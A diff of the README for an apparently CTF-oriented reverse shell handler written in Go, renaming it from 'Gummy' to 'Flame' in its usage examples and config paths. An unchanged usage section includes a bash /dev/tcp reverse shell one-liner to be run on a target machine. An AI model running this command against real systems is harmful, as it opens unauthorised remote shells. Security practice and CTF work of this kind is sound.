@@ -1,4 +1,4 @@
-# Gummy
+# Flame
 
 A modern reverse shell handler for CTF competitions, written in Go. Inspired by [Penelope](https://github.com/brightio/penelope) with enhanced features and a polished CLI.
 
@@ -20,13 +20,13 @@ A modern reverse shell handler for CTF competitions, written in Go. Inspired by 
 
 ```bash
 # Build
-go build -o gummy
+go build -o flame
 
 # Start listener on a network interface
-./gummy -i tun0 -p 4444
+./flame -i tun0 -p 4444
 
 # Or with a direct IP
-./gummy -ip 10.10.14.5 -p 4444
+./flame -ip 10.10.14.5 -p 4444
 ```
 
 On the target machine:
@@ -35,13 +35,13 @@ On the target machine:
 bash -c 'exec bash >& /dev/tcp/10.10.14.5/4444 0>&1 &'
 ```
 
-Back in gummy:
+Back in flame:
 
 ```
  Reverse shell received on session 1 (10.10.11.123)
 
-󰗣 gummy ❯ use 1
-󰗣 gummy [1] ❯ shell
+󰗣 flame ❯ use 1
+󰗣 flame [1] ❯ shell
 # You're now in a fully upgraded PTY shell!
 ```
 
@@ -96,7 +96,7 @@ Back in gummy:
 
 ## Configuration
 
-Gummy uses `~/.gummy/config.toml` for persistent settings:
+Flame uses `~/.flame/config.toml` for persistent settings:
 
 ```bash
 # Enable binbag (local HTTP file server for fast transfers)
@@ -127,7 +127,7 @@ See the [`docs/`](docs/) directory for detailed guides:
 ## Project Structure
 
 ```
-gummy/
+flame/
 ├── main.go              # Entry point, CLI flags
 ├── internal/
 │   ├── listener.go      # TCP listener
